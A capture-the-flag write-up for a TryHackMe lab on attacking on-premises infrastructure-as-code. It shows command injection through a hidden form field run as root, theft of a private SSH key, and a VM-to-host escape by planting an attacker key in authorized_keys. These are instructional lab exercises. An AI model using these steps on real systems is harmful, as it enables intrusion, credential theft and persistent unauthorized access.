# [On-Premises IaC](https://tryhackme.com/room/onpremisesiac)

## Task 7 - Attacking On-Prem IaC

### What is the value stored in the flag1-of-4.txt file?

In `iac/provision/roles/webapp/templates/app/templates/signin.html`:

```html
<form class="form-signin" action="/api/testDB" method="post">
  <input type="hidden" name="_command" value="service mysql status"/>
  <button id="btntestDB" class="btn btn-lg btn-primary btn-block" type="submit">(Dev) Test DB</button>
</form>
```

In `iac/Vagrantfile` we can see the IP of the webserver:

```vagrantfile
config.vm.define "webserver"  do |cfg|
    ...
    cfg.vm.network :private_network, ip: "172.20.128.2", netmask: "24"
```

So:

```shell
curl -X POST http://172.20.128.2:80/api/testDB -d "_command=whoami"
```

Returns:

```html
<h1 class="font-orbitron text-4xl text-gray-100 text-glow">
  root
</h1>
```

So now we can execute whatever we want:

```shell
curl -X POST http://172.20.128.2:80/api/testDB -d "_command=cat /root/flag1-of-4.txt"
```

Returns:

```html
<h1 class="font-orbitron text-4xl text-gray-100 text-glow">
  THM{___.________.___.______.___.__._________}
</h1>
```

You can also do it from the AttackBox with ssh tunneling:

On the AttackBox:

```shell
export MACHINE_IP=10.10.x.x
ssh -L 8080:172.20.128.2:80 entry@$MACHINE_IP
ssh -L 2222:172.20.128.2:22 entry@$MACHINE_IP
```

Then you can go to http://localhost:8080 in the AttackBox or `curl http://localhost:8080` or `ssh localhost -p 2222` 


### What is the value stored in the flag2-of-4.txt file?

```shell
curl -X POST http://172.20.128.2:80/api/testDB -d "_command=ls -laR /vagrant"
```

Returns among other things:

```
/vagrant/keys:
total 16
drwxr-xr-x 2 1000 1000 4096 Jan 23  2024 .
drwxr-xr-x 5 1000 1000 4096 Jul  3 21:07 ..
-rw------- 1 1000 1000 2602 Jan 23  2024 id_rsa
-rw-r--r-- 1 1000 1000  570 Jan 23  2024 id_rsa.pub
```

So we can get the private key:

```shell
curl -X POST http://172.20.128.2:80/api/testDB -d "_command=cat /vagrant/keys/id_rsa"
```

We paste the contents in `id_rsa_vagrant`, we give proper permissions and we ssh:

```shell
chmod 600 id_rsa_vagrant
ssh -i ./id_rsa_vagrant root@172.20.128.2
cat flag2-of-4.txt 
THM{___.__________.____.____.__._______}
```

We have root inside the vagrant VM 🎉

### What is the value stored in the flag3-of-4.txt file?

Continue as root in the vagrant VM:

```shell
mount | grep /dev/root

/dev/root on /vagrant type ext4 (rw,relatime,discard)
/dev/root on /tmp/datacopy type ext4 (rw,relatime,discard)
/dev/root on /tmp/provision type ext4 (rw,relatime,discard)
/dev/root on /etc/resolv.conf type ext4 (rw,relatime,discard)
/dev/root on /etc/hostname type ext4 (rw,relatime,discard)
/dev/root on /etc/hosts type ext4 (rw,relatime,discard)

cat /tmp/datacopy/flag3-of-4.txt
THM{___.______.______.__.__________}
```

### What is the value stored in the flag4-of-4.txt file?

On the AttackBox generate a key pair:

```shell
ssh-keygen
cat ~/.ssh/id_rsa.pub
```

As root in the vagrant VM add public key generated in previous step in the authorized_keys of ubuntu user through the vagrant mount:

```shell
vi /tmp/datacopy/.ssh/authorized_keys
```

Now from the AttackBox:

```shell
export MACHINE_IP=10.10.x.x
ssh -i ~/.ssh/id_rsa ubuntu@$MACHINE_IP
```

We have ubuntu inside the host machine 🎉

```shell
sudo su
cat /root/flag4-of-4.txt
THM{____________._______.____.__________.______}
```

We have root inside the host machine 🎉
